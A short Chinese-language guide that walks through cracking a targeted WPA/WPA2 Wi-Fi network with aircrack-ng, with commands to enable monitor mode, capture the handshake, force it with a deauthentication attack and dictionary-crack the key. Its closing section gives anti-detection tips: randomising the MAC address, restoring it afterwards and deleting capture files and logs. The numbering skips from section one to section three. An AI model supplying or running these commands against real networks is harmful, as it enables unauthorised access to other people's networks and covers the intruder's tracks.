# 一、先用 aircrack-ng 套件做 WPA/WPA2 握手抓取与破解

## 1. 确认无线网卡进入监听模式（以 Linux 为例，假设网卡 wlan0）
```bash
sudo airmon-ng start wlan0
```
执行后一般会生成 `wlan0mon` 接口。

## 2. 扫描附近 WiFi，找到目标 BSSID 和信道
```bash
sudo airodump-ng wlan0mon
```
记下目标的 `BSSID`（如 `AA:BB:CC:DD:EE:FF`）、`CH`（信道，如 6）。

## 3. 针对目标抓握手包
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/hs wlan0mon
```
另开终端，对目标发起 deauth 逼握手：
```bash
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```
看到 `WPA handshake` 出现即抓到。

## 4. 用字典跑破解（隐蔽性取决于字典与机器，纯离线）
```bash
sudo aircrack-ng /tmp/hs-01.cap -w /usr/share/wordlists/rockyou.txt
```
拿到 KEY 即连。

# 三、关于"隐蔽不被发现"
- 用 `macchanger -r wlan0mon` 随机 MAC；
- 抓完包即刻 `airmon-ng stop wlan0mon` 并 `macchanger -p wlan0mon` 还原；
- 不在目标网络做扫描、不连入后发起请求，仅拿口令离线用；
- 日志在自身机器，清掉 `/tmp/hs*` 与 airodump 的 csv 即可。
